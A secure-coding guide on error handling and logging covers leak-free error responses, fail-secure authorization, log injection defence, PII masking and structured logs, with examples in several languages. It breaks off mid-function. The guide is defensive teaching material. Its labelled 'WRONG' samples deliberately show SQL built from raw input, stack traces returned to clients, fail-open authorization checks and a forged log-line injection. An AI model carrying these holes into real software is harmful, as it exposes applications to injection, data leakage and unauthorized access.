# Secure Error Handling and Logging

> **Domain:** Security > Secure Coding > Error Handling and Logging
> **Difficulty:** Intermediate to Advanced
> **Last Updated:** 2026-03-10

## Why It Matters

Error handling and logging are two of the most overlooked attack surfaces in application security. A stack trace in a production error response hands an attacker a blueprint of your internals -- framework versions, file paths, database schemas, third-party libraries. A log file that accepts unvalidated user input becomes a vector for log injection, SIEM poisoning, and forensic evidence tampering. A system that fails open when an authorization check throws an exception grants access to everyone when the auth service goes down.

The consequences are not theoretical. CWE-209 (Generation of Error Message Containing Sensitive Information) appears consistently in the CWE Top 25. CVE-2021-44228 (Log4Shell) demonstrated that a logging library itself can become the vulnerability when it processes untrusted input. PCI-DSS Requirement 10, SOC2 CC7.2, and HIPAA audit controls all mandate secure, tamper-evident logging.

This guide covers the complete lifecycle: how to handle errors without leaking information, how to log security events without introducing new vulnerabilities, how to protect log integrity, and how to build observability that serves both operational and security needs.

---

## Secure Error Handling Principles

### The Core Rule: Two Audiences, Two Messages

Every error has two consumers who need different information:

```
Error occurs in application
         |
         +--> External Response (to the user/caller)
         |    - Generic, safe, actionable
         |    - "Something went wrong. Please try again."
         |    - No internal details whatsoever
         |
         +--> Internal Log (to the operations/security team)
              - Detailed, contextual, correlated
              - Stack trace, query parameters, request ID
              - Enough to diagnose and reproduce
```

Never combine these audiences. The external response must contain zero internal implementation details. The internal log must contain everything needed to diagnose the issue.

### Information Leakage via Errors (CWE-209)

CWE-209 covers error messages that reveal sensitive system information. Attackers deliberately trigger errors to map your technology stack, database schema, file system layout, and library versions.

**WRONG -- Error responses that leak internal details:**

```typescript
// INSECURE: Every one of these error responses helps the attacker

// Leaks: database type, table name, column name, SQL syntax
app.get("/api/users/:id", async (req, res) => {
  try {
    const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
    res.json(user);
  } catch (error) {
    // Attacker now knows: PostgreSQL, "users" table, column structure
    res.status(500).json({
      error: error.message,
      // "relation \"users\" does not exist" or
      // "invalid input syntax for type uuid: \"1 OR 1=1\""
    });
  }
});

// Leaks: full file path, framework version, OS information
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    // "Error: ENOENT: no such file or directory, open '/opt/app/v2.3.1/config/db.yaml'"
    // Reveals: OS (Linux), app path, version number, config file location
  });
});

// Leaks: authentication mechanism details
app.post("/api/login", async (req, res) => {
  try {
    const user = await findUser(req.body.email);
    if (!user) {
      // Tells attacker this email does not exist -- enables enumeration
      return res.status(404).json({ error: "No account found for user@example.com" });
    }
    if (!await verifyPassword(req.body.password, user.passwordHash)) {
      // Confirms the email IS valid -- password is the problem
      return res.status(401).json({ error: "Incorrect password" });
    }
  } catch (error) {
    // Leaks bcrypt version, hash configuration
    res.status(500).json({ error: error.message });
  }
});
```

**RIGHT -- Generic external responses, detailed internal logs:**

```typescript
// SECURE: External responses reveal nothing. Internal logs capture everything.

import { randomUUID } from "crypto";
import { logger } from "./logger";

app.get("/api/users/:id", async (req, res) => {
  const requestId = req.headers["x-request-id"] || randomUUID();
  try {
    const user = await userService.findById(req.params.id);
    if (!user) {
      return res.status(404).json({
        error: "Resource not found",
        requestId,
      });
    }
    res.json(user);
  } catch (error) {
    // Detailed internal log -- never sent to client
    logger.error("Failed to fetch user", {
      requestId,
      userId: req.params.id,
      error: error.message,
      stack: error.stack,
      route: req.originalUrl,
      method: req.method,
      ip: req.ip,
    });

    // Generic external response -- reveals nothing
    res.status(500).json({
      error: "An internal error occurred",
      requestId, // Allows support to correlate without leaking details
    });
  }
});

// Login: same message for all failure modes
app.post("/api/login", async (req, res) => {
  const requestId = randomUUID();
  const genericMessage = "Invalid email or password";

  try {
    const user = await findUser(req.body.email);
    if (!user) {
      logger.warn("Login failed: user not found", {
        requestId,
        email: req.body.email,
        ip: req.ip,
      });
      return res.status(401).json({ error: genericMessage, requestId });
    }

    if (!await verifyPassword(req.body.password, user.passwordHash)) {
      logger.warn("Login failed: wrong password", {
        requestId,
        userId: user.id,
        ip: req.ip,
      });
      return res.status(401).json({ error: genericMessage, requestId });
    }

    // Success path...
  } catch (error) {
    logger.error("Login error", { requestId, error: error.message, stack: error.stack });
    return res.status(401).json({ error: genericMessage, requestId });
  }
});
```

**Go -- secure error handling:**

```go
// SECURE: Generic HTTP response, detailed structured log

func getUserHandler(w http.ResponseWriter, r *http.Request) {
    requestID := r.Header.Get("X-Request-ID")
    if requestID == "" {
        requestID = uuid.NewString()
    }

    userID := chi.URLParam(r, "userID")
    user, err := userService.FindByID(r.Context(), userID)
    if err != nil {
        // Internal: full diagnostic detail
        slog.Error("failed to fetch user",
            "request_id", requestID,
            "user_id", userID,
            "error", err.Error(),
            "route", r.URL.Path,
            "method", r.Method,
            "remote_addr", r.RemoteAddr,
        )

        // External: generic message with correlation ID only
        w.Header().Set("Content-Type", "application/json")
        w.WriteHeader(http.StatusInternalServerError)
        json.NewEncoder(w).Encode(map[string]string{
            "error":      "An internal error occurred",
            "request_id": requestID,
        })
        return
    }

    json.NewEncoder(w).Encode(user)
}
```

**Python -- secure error handling with Flask:**

```python
# SECURE: Custom error handler that never leaks internals

import uuid
import logging
from flask import Flask, jsonify, request

app = Flask(__name__)
logger = logging.getLogger("security")

@app.errorhandler(Exception)
def handle_unexpected_error(error):
    request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))

    # Internal: full detail for diagnosis
    logger.error(
        "Unhandled exception",
        extra={
            "request_id": request_id,
            "error_type": type(error).__name__,
            "error_message": str(error),
            "path": request.path,
            "method": request.method,
            "remote_addr": request.remote_addr,
        },
        exc_info=True,  # Includes stack trace in the log
    )

    # External: generic response
    return jsonify({
        "error": "An internal error occurred",
        "request_id": request_id,
    }), 500

@app.errorhandler(404)
def handle_not_found(error):
    return jsonify({"error": "Resource not found"}), 404

@app.errorhandler(403)
def handle_forbidden(error):
    return jsonify({"error": "Access denied"}), 403
```

---

## Custom Error Pages

Default framework error pages expose technology stack, framework version, and debug information. Replace every default error page before deploying to production.

### Express (Node.js)

```typescript
// SECURE: Custom error handler as the LAST middleware

// 404 handler -- must be after all route definitions
app.use((req, res, next) => {
  res.status(404).json({ error: "Resource not found" });
});

// Global error handler -- must have exactly 4 parameters
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  const requestId = req.headers["x-request-id"] || randomUUID();

  logger.error("Unhandled error", {
    requestId,
    error: err.message,
    stack: err.stack,
    path: req.originalUrl,
    method: req.method,
  });

  // Never send stack traces in production
  const isDev = process.env.NODE_ENV === "development";
  res.status(500).json({
    error: "An internal error occurred",
    requestId,
    ...(isDev ? { debug: err.message } : {}),
  });
});

// Disable the X-Powered-By header
app.disable("x-powered-by");
```

### Django (Python)

```python
# settings.py -- SECURE: Disable debug mode and configure custom handlers

DEBUG = False  # CRITICAL: Never True in production

# Custom error views
handler400 = "myapp.views.errors.bad_request"
handler403 = "myapp.views.errors.forbidden"
handler404 = "myapp.views.errors.not_found"
handler500 = "myapp.views.errors.server_error"

# myapp/views/errors.py
from django.http import JsonResponse
import uuid
import logging

logger = logging.getLogger("django.security")

def server_error(request):
    request_id = getattr(request, "request_id", str(uuid.uuid4()))
    logger.error("500 error", extra={
        "request_id": request_id,
        "path": request.path,
        "method": request.method,
    })
    return JsonResponse(
        {"error": "An internal error occurred", "request_id": request_id},
        status=500,
    )

def not_found(request, exception=None):
    return JsonResponse({"error": "Resource not found"}, status=404)

def forbidden(request, exception=None):
    return JsonResponse({"error": "Access denied"}, status=403)

def bad_request(request, exception=None):
    return JsonResponse({"error": "Bad request"}, status=400)
```

### Spring Boot (Java)

```java
// SECURE: Global exception handler that prevents stack trace leakage

@RestControllerAdvice
public class GlobalExceptionHandler {

    private static final Logger logger = LoggerFactory.getLogger(GlobalExceptionHandler.class);

    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleAllExceptions(
            Exception ex, HttpServletRequest request) {

        String requestId = Optional.ofNullable(request.getHeader("X-Request-ID"))
                .orElse(UUID.randomUUID().toString());

        // Internal: detailed log
        logger.error("Unhandled exception [requestId={}] [path={}] [method={}]",
                requestId, request.getRequestURI(), request.getMethod(), ex);

        // External: generic response
        ErrorResponse response = new ErrorResponse(
                "An internal error occurred",
                requestId
        );
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(response);
    }

    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity<ErrorResponse> handleNotFound(ResourceNotFoundException ex) {
        return ResponseEntity.status(HttpStatus.NOT_FOUND)
                .body(new ErrorResponse("Resource not found", null));
    }

    @ExceptionHandler(AccessDeniedException.class)
    public ResponseEntity<ErrorResponse> handleAccessDenied(AccessDeniedException ex) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN)
                .body(new ErrorResponse("Access denied", null));
    }
}

// application.properties -- disable default error details
// server.error.include-stacktrace=never
// server.error.include-message=never
// server.error.include-binding-errors=never
// server.error.include-exception=false
```

### Go (net/http)

```go
// SECURE: Recovery middleware that catches panics and returns generic errors

func recoveryMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        defer func() {
            if rec := recover(); rec != nil {
                requestID := r.Header.Get("X-Request-ID")
                if requestID == "" {
                    requestID = uuid.NewString()
                }

                // Internal: full panic detail with stack trace
                slog.Error("panic recovered",
                    "request_id", requestID,
                    "panic", fmt.Sprintf("%v", rec),
                    "stack", string(debug.Stack()),
                    "path", r.URL.Path,
                    "method", r.Method,
                    "remote_addr", r.RemoteAddr,
                )

                // External: generic response
                w.Header().Set("Content-Type", "application/json")
                w.WriteHeader(http.StatusInternalServerError)
                json.NewEncoder(w).Encode(map[string]string{
                    "error":      "An internal error occurred",
                    "request_id": requestID,
                })
            }
        }()
        next.ServeHTTP(w, r)
    })
}
```

---

## Error Handling Patterns

### Global Error Handler / Middleware Pattern

Centralize error handling in a single middleware layer. Do not scatter try-catch blocks with individual error responses across every route.

```typescript
// SECURE: Centralized error handling with typed errors

// Step 1: Define an error hierarchy
class AppError extends Error {
  constructor(
    message: string,
    public readonly statusCode: number,
    public readonly code: string,
    public readonly isOperational: boolean = true,
  ) {
    super(message);
    this.name = this.constructor.name;
  }
}

class NotFoundError extends AppError {
  constructor(resource: string) {
    super(`${resource} not found`, 404, "RESOURCE_NOT_FOUND");
  }
}

class ForbiddenError extends AppError {
  constructor() {
    super("Access denied", 403, "FORBIDDEN");
  }
}

class ValidationError extends AppError {
  constructor(message: string) {
    super(message, 400, "VALIDATION_ERROR");
  }
}

// Step 2: Routes throw typed errors -- never send responses directly on error
app.get("/api/orders/:id", authenticate, async (req, res) => {
  const order = await orderService.findById(req.params.id);
  if (!order) {
    throw new NotFoundError("Order");
  }
  if (order.userId !== req.user.id) {
    throw new ForbiddenError();
  }
  res.json(order);
});

// Step 3: Global error handler catches everything
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  const requestId = req.headers["x-request-id"] || randomUUID();

  if (err instanceof AppError && err.isOperational) {
    // Operational errors: expected, safe to show the message
    logger.warn("Operational error", {
      requestId,
      code: err.code,
      statusCode: err.statusCode,
      path: req.originalUrl,
    });
    return res.status(err.statusCode).json({
      error: err.message,
      code: err.code,
      requestId,
    });
  }

  // Programming errors: unexpected, never expose details
  logger.error("Unexpected error", {
    requestId,
    error: err.message,
    stack: err.stack,
    path: req.originalUrl,
    method: req.method,
  });

  res.status(500).json({
    error: "An internal error occurred",
    requestId,
  });

  // For non-operational errors, consider restarting the process
  // to avoid corrupted state
});
```

### React Error Boundary

```typescript
// SECURE: Error boundary that does not expose component internals to users

class SecurityErrorBoundary extends React.Component<
  { children: React.ReactNode },
  { hasError: boolean; errorId: string | null }
> {
  constructor(props: { children: React.ReactNode }) {
    super(props);
    this.state = { hasError: false, errorId: null };
  }

  static getDerivedStateFromError(): { hasError: boolean; errorId: string } {
    return { hasError: true, errorId: crypto.randomUUID() };
  }

  componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
    // Send to monitoring -- NOT to the UI
    errorReportingService.captureException(error, {
      errorId: this.state.errorId,
      componentStack: errorInfo.componentStack,
      // Never include these in the rendered output
    });
  }

  render() {
    if (this.state.hasError) {
      // Generic message only -- no stack trace, no component names
      return (
        <div role="alert">
          <h2>Something went wrong</h2>
          <p>Please refresh the page or contact support.</p>
          <p>Reference: {this.state.errorId}</p>
        </div>
      );
    }
    return this.props.children;
  }
}
```

### Go Panic Recovery

```go
// SECURE: Structured panic recovery that logs but never leaks

func recoverMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        defer func() {
            if err := recover(); err != nil {
                reqID := middleware.GetReqID(r.Context())

                slog.Error("panic recovered in HTTP handler",
                    "request_id", reqID,
                    "error", fmt.Sprintf("%v", err),
                    "stack", string(debug.Stack()),
                    "method", r.Method,
                    "path", r.URL.Path,
                )

                w.Header().Set("Content-Type", "application/json")
                w.WriteHeader(http.StatusInternalServerError)
                fmt.Fprintf(w, `{"error":"An internal error occurred","request_id":"%s"}`, reqID)
            }
        }()
        next.ServeHTTP(w, r)
    })
}
```

### Exception Hierarchy Design

Design a typed exception hierarchy so that the global handler can distinguish between operational errors (safe to show) and programming errors (must be hidden).

```
Exception Hierarchy:

  Error (base)
    |
    +-- AppError (isOperational = true)
    |     |
    |     +-- ValidationError (400)
    |     +-- AuthenticationError (401)
    |     +-- ForbiddenError (403)
    |     +-- NotFoundError (404)
    |     +-- ConflictError (409)
    |     +-- RateLimitError (429)
    |
    +-- InfrastructureError (isOperational = false)
          |
          +-- DatabaseConnectionError
          +-- ExternalServiceError
          +-- FileSystemError

Operational errors: expected, handled, safe external message.
Infrastructure errors: unexpected, logged in full, generic external message.
```

---

## Fail-Secure vs Fail-Open

When a security check encounters an error -- a timeout, a network failure, a parsing exception -- the system must default to DENY. Fail-open means that a broken security check grants access. Fail-secure means that a broken security check blocks access.

**WRONG -- Fail-open authorization (dangerous):**

```typescript
// INSECURE: If the policy service is down, everyone becomes an admin

async function isAuthorized(userId: string, resource: string): Promise<boolean> {
  try {
    const result = await policyService.evaluate(userId, resource);
    return result.allowed;
  } catch (error) {
    // DANGEROUS: Auth service down = grant access to everything
    console.error("Policy service unavailable, defaulting to allow");
    return true;
  }
}
```

```go
// INSECURE: Fail-open -- error in permission check grants access
func checkAccess(userID, resource string) bool {
    resp, err := authClient.Check(userID, resource)
    if err != nil {
        // DANGEROUS: network error = access granted
        log.Printf("auth check failed: %v, allowing access", err)
        return true
    }
    return resp.Allowed
}
```

**RIGHT -- Fail-secure authorization (safe):**

```typescript
// SECURE: If anything goes wrong, access is denied

async function isAuthorized(userId: string, resource: string): Promise<boolean> {
  try {
    const result = await policyService.evaluate(userId, resource, {
      timeout: 3000, // Fail fast -- do not hang indefinitely
    });

    // Only explicit ALLOW grants access -- anything else is denial
    if (result.decision !== "ALLOW") {
      logger.info("Access denied by policy", { userId, resource, decision: result.decision });
      return false;
    }
    return true;
  } catch (error) {
    // SECURE: Any error = deny access
    logger.error("Policy evaluation failed, denying access", {
      userId,
      resource,
      error: error.message,
    });
    return false;
  }
}
```

```go
// SECURE: Fail-closed -- error in permission check denies access
func checkAccess(ctx context.Context, userID, resource string) bool {
    ctx, cancel := context.WithTimeout(ctx, 3*time.Second)
    defer cancel()

    resp, err := authClient.Check(ctx, userID, resource)
    if err != nil {
        // SECURE: any failure = deny
        slog.Error("auth check failed, denying access",
            "user_id", userID,
            "resource", resource,
            "error", err.Error(),
        )
        return false
    }

    // Only explicit Allow grants access
    return resp.Decision == DecisionAllow
}
```

```python
# SECURE: Fail-closed authorization in Python

def is_authorized(user_id: str, resource: str) -> bool:
    try:
        result = policy_service.evaluate(
            user_id=user_id,
            resource=resource,
            timeout=3.0,
        )
        # Only explicit ALLOW grants access
        if result.decision != "ALLOW":
            logger.info("Access denied by policy",
                        extra={"user_id": user_id, "resource": resource})
            return False
        return True
    except Exception as e:
        # SECURE: Any exception = deny
        logger.error("Policy evaluation failed, denying access",
                     extra={"user_id": user_id, "resource": resource, "error": str(e)})
        return False
```

---

## Security Event Logging

### What to Log

Log every event that has security relevance. Each log entry must answer: WHO did WHAT to WHICH resource, WHEN, FROM WHERE, and what was the OUTCOME.

```
Security Events to Log:

  Authentication Events:
    - Successful login (user, IP, device, method)
    - Failed login (user, IP, failure reason internally)
    - Account lockout (user, trigger count, IP)
    - Password change / reset (user, method)
    - MFA enrollment / removal (user, method)
    - Logout (user, session duration)
    - Token refresh / revocation

  Authorization Events:
    - Access denied (user, resource, action, policy)
    - Privilege escalation attempt (user, requested role)
    - Cross-tenant access attempt

  Input Validation Events:
    - Malformed input rejected (endpoint, pattern matched)
    - Suspected injection attempt (SQLi, XSS, command injection)
    - File upload rejected (type, size, content check)

  Data Access Events:
    - Bulk data export (user, record count, query)
    - Access to sensitive records (PII, financial, health)
    - Data modification in sensitive tables

  Administrative Events:
    - User creation / deletion (actor, target)
    - Role / permission change (actor, target, old value, new value)
    - Configuration change (actor, setting, old value, new value)
    - System startup / shutdown

  Application Events:
    - Unhandled exceptions (with sanitized context)
    - External service failures (dependency, error type)
    - Rate limit triggered (IP, endpoint, count)
```

### What NOT to Log

Never log data that, if the log is compromised, would directly enable further attacks or violate privacy regulations.

```
NEVER Log These Values:

  Credentials:
    - Passwords (plaintext or hashed)
    - API keys / secret tokens
    - Session tokens / JWTs
    - OAuth client secrets
    - Private keys / certificates

  Sensitive Personal Data:
    - Full credit card numbers (log last 4 digits only)
    - Social Security Numbers / national IDs
    - Full date of birth
    - Medical / health records
    - Biometric data

  Regulated Data:
    - Full bank account numbers
    - Authentication answers (security questions)
    - Encryption keys or key material

  Instead:
    - Log a truncated/masked version: "****1234"
    - Log a hash/identifier: "card_id: card_abc123"
    - Log the event without the value: "password_changed: true"
```

**Security event logging implementation:**

```typescript
// SECURE: Structured security event logger

interface SecurityEvent {
  timestamp: string;
  eventType: string;
  severity: "info" | "warn" | "error" | "critical";
  actor: {
    userId?: string;
    ip: string;
    userAgent?: string;
    sessionId?: string;
  };
  action: string;
  resource?: {
    type: string;
    id: string;
  };
  outcome: "success" | "failure" | "denied" | "error";
  details: Record<string, unknown>;
  requestId: string;
}

class SecurityLogger {
  private logger: Logger;

  logAuthEvent(event: Omit<SecurityEvent, "timestamp" | "eventType">) {
    this.logger.info({
      ...event,
      timestamp: new Date().toISOString(),
      eventType: "authentication",
    });
  }

  logAccessDenied(actor: SecurityEvent["actor"], resource: string, action: string) {
    this.logger.warn({
      timestamp: new Date().toISOString(),
      eventType: "authorization",
      severity: "warn",
      actor,
      action,
      resource: { type: "endpoint", id: resource },
      outcome: "denied",
    });
  }

  logSuspiciousInput(actor: SecurityEvent["actor"], endpoint: string, pattern: string) {
    this.logger.warn({
      timestamp: new Date().toISOString(),
      eventType: "input_validation",
      severity: "warn",
      actor,
      action: "suspicious_input_detected",
      resource: { type: "endpoint", id: endpoint },
      outcome: "blocked",
      details: { pattern },
    });
  }
}

// Usage in authentication middleware
app.post("/api/login", async (req, res) => {
  const actor = { ip: req.ip, userAgent: req.headers["user-agent"] };

  // ... authentication logic ...

  if (loginSuccess) {
    securityLogger.logAuthEvent({
      severity: "info",
      actor: { ...actor, userId: user.id },
      action: "login",
      outcome: "success",
      details: { method: "password" },
      requestId,
    });
  } else {
    securityLogger.logAuthEvent({
      severity: "warn",
      actor,
      action: "login",
      outcome: "failure",
      details: { reason: "invalid_credentials", attemptCount: failedAttempts },
      requestId,
    });
  }
});
```

---

## Log Injection Prevention (CWE-117)

Log injection occurs when an attacker embeds control characters -- newlines, carriage returns, ANSI escape codes -- into user input that gets written to log files. This allows the attacker to forge log entries, corrupt log analysis, or exploit log viewing tools.

### The Attack

```
Attacker sends username:
  "admin\n2026-03-10T12:00:00Z [INFO] User admin logged in successfully"

Unprotected log output:
  2026-03-10T12:00:00Z [WARN] Login failed for user: admin
  2026-03-10T12:00:00Z [INFO] User admin logged in successfully

The second line is FAKE -- injected by the attacker.
A human or SIEM reading the log sees a "successful login" that never happened.
```

### Defense: Structured Logging (JSON)

Structured logging (JSON format) is the primary defense against log injection. When user input is a JSON string value, newlines and special characters are escaped automatically by the JSON serializer. The log is a single line per entry, making injection structurally impossible.

**WRONG -- String concatenation in logs (vulnerable to injection):**

```typescript
// INSECURE: Log injection via string concatenation

import winston from "winston";

const logger = winston.createLogger({
  format: winston.format.simple(), // Plaintext format -- vulnerable
  transports: [new winston.transports.File({ filename: "app.log" })],
});

app.post("/api/login", (req, res) => {
  const { username } = req.body;
  // VULNERABLE: username could contain newlines, fake log entries
  logger.info(`Login attempt for user: ${username}`);
  // If username = "admin\n2026-03-10 [INFO] Login success for admin"
  // the log now contains a forged entry
});
```

**RIGHT -- Structured logging with winston (TypeScript):**

```typescript
// SECURE: JSON structured logging prevents injection

import winston from "winston";

const logger = winston.createLogger({
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json(), // JSON format: newlines in values are escaped
  ),
  transports: [new winston.transports.File({ filename: "app.log" })],
});

app.post("/api/login", (req, res) => {
  const { username } = req.body;
  // SECURE: username is a JSON string value -- \n becomes \\n
  logger.info("Login attempt", { username, ip: req.ip });
  // Output: {"level":"info","message":"Login attempt","username":"admin\\n...","ip":"1.2.3.4","timestamp":"..."}
  // The injected newline is escaped. Single JSON line. Cannot forge entries.
});
```

**RIGHT -- Structured logging with pino (TypeScript):**

```typescript
// SECURE: pino outputs JSON by default -- inherently safe against injection

import pino from "pino";

const logger = pino({
  level: "info",
  // Explicitly redact sensitive fields
  redact: {
    paths: ["req.headers.authorization", "req.headers.cookie", "*.password", "*.token"],
    censor: "[REDACTED]",
  },
});

app.post("/api/login", (req, res) => {
  // All values are JSON-serialized -- injection is structurally impossible
  logger.info({ username: req.body.username, ip: req.ip }, "Login attempt");
});
```

**RIGHT -- Structured logging with zerolog (Go):**

```go
// SECURE: zerolog outputs JSON -- injection-safe by design

import (
    "os"
    "github.com/rs/zerolog"
    "github.com/rs/zerolog/log"
)

func init() {
    zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
    log.Logger = zerolog.New(os.Stdout).With().Timestamp().Logger()
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
    username := r.FormValue("username")

    // SECURE: username is a JSON string value
    // Even if username contains "\n" or control characters, they are escaped
    log.Info().
        Str("username", username).
        Str("ip", r.RemoteAddr).
        Str("user_agent", r.UserAgent()).
        Msg("Login attempt")
    // Output: {"level":"info","username":"admin\\nfake entry","ip":"...","time":...,"message":"Login attempt"}
}
```

**RIGHT -- Structured logging with zap (Go):**

```go
// SECURE: zap JSON encoder escapes all control characters

import "go.uber.org/zap"

func main() {
    logger, _ := zap.NewProduction() // Production mode = JSON output
    defer logger.Sync()

    sugar := logger.Sugar()
    sugar.Infow("Login attempt",
        "username", userInput,   // Safely JSON-encoded
        "ip", remoteAddr,
        "user_agent", userAgent,
    )
}
```

**RIGHT -- Structured logging with structlog (Python):**

```python
# SECURE: structlog with JSON renderer prevents injection

import structlog

structlog.configure(
    processors=[
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.add_log_level,
        structlog.processors.JSONRenderer(),  # JSON output -- injection-safe
    ],
)

logger = structlog.get_logger()

def login_handler(request):
    username = request.form.get("username", "")
    # SECURE: username is JSON-encoded, newlines become \\n
    logger.info("login_attempt", username=username, ip=request.remote_addr)
```

**RIGHT -- Python standard logging with JSON formatter:**

```python
# SECURE: Standard logging with python-json-logger

import logging
from pythonjsonlogger import jsonlogger

logger = logging.getLogger("security")
handler = logging.StreamHandler()
formatter = jsonlogger.JsonFormatter(
    fmt="%(asctime)s %(levelname)s %(name)s %(message)s",
    rename_fields={"asctime": "timestamp", "levelname": "level"},
)
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# All bound data is JSON-serialized -- safe from injection
logger.info("Login attempt", extra={"username": user_input, "ip": remote_addr})
```

### Additional Sanitization for Non-JSON Logs

If you must use plaintext log format (legacy systems), sanitize input before logging:

```typescript
// Sanitize user input before including in plaintext logs
function sanitizeForLog(input: string): string {
  return input
    .replace(/[\n\r]/g, " ")     // Remove newlines (prevents entry forging)
    .replace(/[\x00-\x1f]/g, "") // Remove all control characters
    .substring(0, 1000);          // Limit length to prevent log flooding
}
```

---

## PII Masking in Logs

Even with structured logging, you must prevent PII from appearing in log files. Logs are often stored longer than application databases, replicated to multiple systems, and accessed by more people. Mask PII at the point of logging.

### Masking Functions

```typescript
// PII masking utilities

function maskEmail(email: string): string {
  const [local, domain] = email.split("@");
  if (!domain) return "***@***";
  const maskedLocal = local.charAt(0) + "***";
  return `${maskedLocal}@${domain}`;
  // "john.doe@example.com" -> "j***@example.com"
}

function maskCreditCard(cardNumber: string): string {
  const digits = cardNumber.replace(/\D/g, "");
  if (digits.length < 4) return "****";
  return "****" + digits.slice(-4);
  // "4111111111111111" -> "****1111"
}

function maskPhone(phone: string): string {
  const digits = phone.replace(/\D/g, "");
  if (digits.length < 4) return "****";
  return "****" + digits.slice(-4);
  // "+1-555-123-4567" -> "****4567"
}

function maskIP(ip: string): string {
  // IPv4: zero the last octet
  if (ip.includes(".")) {
    const parts = ip.split(".");
    parts[3] = "0";
    return parts.join(".");
    // "192.168.1.42" -> "192.168.1.0"
  }
  // IPv6: zero the last 80 bits
  return ip.replace(/:[\da-f]+:[\da-f]+:[\da-f]+:[\da-f]+:[\da-f]+$/i, ":0:0:0:0:0");
}

function maskSSN(ssn: string): string {
  return "***-**-" + ssn.replace(/\D/g, "").slice(-4);
  // "123-45-6789" -> "***-**-6789"
}
```

### Automatic PII Redaction in Structured Logging

```typescript
// SECURE: Automatic PII detection and masking in pino

import pino from "pino";

const PII_PATTERNS: Array<{ pattern: RegExp; mask: (v: string) => string }> = [
  {
    pattern: /^[^@]+@[^@]+\.[^@]+$/,
    mask: maskEmail,
  },
  {
    pattern: /^\d{3}-?\d{2}-?\d{4}$/,
    mask: maskSSN,
  },
  {
    pattern: /^\d{13,19}$/,
    mask: maskCreditCard,
  },
];

function redactPII(obj: Record<string, unknown>): Record<string, unknown> {
  const redacted: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(obj)) {
    if (typeof value === "string") {
      let masked = value;
      for (const { pattern, mask } of PII_PATTERNS) {
        if (pattern.test(value)) {
          masked = mask(value);
          break;
        }
      }
      redacted[key] = masked;
    } else if (typeof value === "object" && value !== null) {
      redacted[key] = redactPII(value as Record<string, unknown>);
    } else {
      redacted[key] = value;
    }
  }
  return redacted;
}

// Use pino's built-in redaction for known fields
const logger = pino({
  redact: {
    paths: [
      "*.password",
      "*.token",
      "*.authorization",
      "*.creditCard",
      "*.ssn",
      "*.cookie",
    ],
    censor: "[REDACTED]",
  },
});
```

```go
// SECURE: PII masking in Go structured logging

package logging

import (
    "regexp"
    "strings"
)

var emailRegex = regexp.MustCompile(`^[^@]+@[^@]+\.[^@]+$`)

func MaskEmail(email string) string {
    parts := strings.SplitN(email, "@", 2)
    if len(parts) != 2 {
        return "***@***"
    }
    if len(parts[0]) == 0 {
        return "***@" + parts[1]
    }
    return string(parts[0][0]) + "***@" + parts[1]
}

func MaskCreditCard(card string) string {
    digits := regexp.MustCompile(`\D`).ReplaceAllString(card, "")
    if len(digits) < 4 {
        return "****"
    }
    return "****" + digits[len(digits)-4:]
}

func MaskIP(ip string) string {
    parts := strings.Split(ip, ".")
    if len(parts) == 4 {
        parts[3] = "0"
        return strings.Join(parts, ".")
    }
    return ip // Return as-is for non-IPv4 (handle IPv6 separately)
}
```

```python
# SECURE: PII masking in Python

import re

def mask_email(email: str) -> str:
    parts = email.split("@")
    if len(parts) != 2:
        return "***@***"
    local = parts[0]
    return f"{local[0]}***@{parts[1]}" if local else f"***@{parts[1]}"

def mask_credit_card(card: str) -> str:
    digits = re.sub(r"\D", "", card)
    if len(digits) < 4:
        return "****"
    return f"****{digits[-4:]}"

def mask_phone(phone: str) -> str:
    digits = re.sub(r"\D", "", phone)
    if len(digits) < 4:
        return "****"
    return f"****{digits[-4:]}"

def mask_ip(ip: str) -> str:
    parts = ip.split(".")
    if len(parts) == 4:
        parts[3] = "0"
        return ".".join(parts)
    return ip

# Use with structlog processors
def pii_masking_processor(logger, method_name, event_dict):
    """structlog processor that automatically masks known PII fields."""
    pii_fields = {
        "email": mask_email,
        "credit_card": mask_credit_card,
        "phone": mask_phone,
        "ip": mask_ip,
        "remote_addr": mask_ip,
    }
    for field, masker in pii_fields.items():
        if field in event_dict and isinstance(event_dict[field], str):
            event_dict[field] = masker(event_dict[field])
    return event_dict
```

---

## Structured Logging for Security

### JSON Log Format and Schema

Define a consistent schema for all security-relevant log entries. This enables automated parsing, alerting, and correlation in your SIEM.

```json
{
  "timestamp": "2026-03-10T14:32:01.123Z",
  "level": "warn",
  "event_type": "authentication",
  "event_name": "login_failed",
  "service": "auth-service",
  "environment": "production",
  "version": "2.4.1",
  "request_id": "req_a1b2c3d4",
  "correlation_id": "corr_x9y8z7",
  "trace_id": "trace_00112233",
  "actor": {
    "user_id": null,
    "ip": "203.0.113.42",
    "user_agent": "Mozilla/5.0...",
    "geo": "US-CA"
  },
  "action": "login",
  "resource": {
    "type": "auth_endpoint",
    "id": "/api/v1/login"
  },
  "outcome": "failure",
  "details": {
    "reason": "invalid_credentials",
    "attempt_count": 4,
    "lockout_threshold": 5
  },
  "duration_ms": 234
}
```

### Correlation IDs and Request Tracing

Every request must carry a correlation ID that flows through all services, logs, and error responses. This enables end-to-end tracing of security events across a distributed system.

```typescript
// SECURE: Correlation ID middleware

import { randomUUID } from "crypto";
import { AsyncLocalStorage } from "async_hooks";

const requestContext = new AsyncLocalStorage<{ requestId: string; correlationId: string }>();

function correlationMiddleware(req: Request, res: Response, next: NextFunction) {
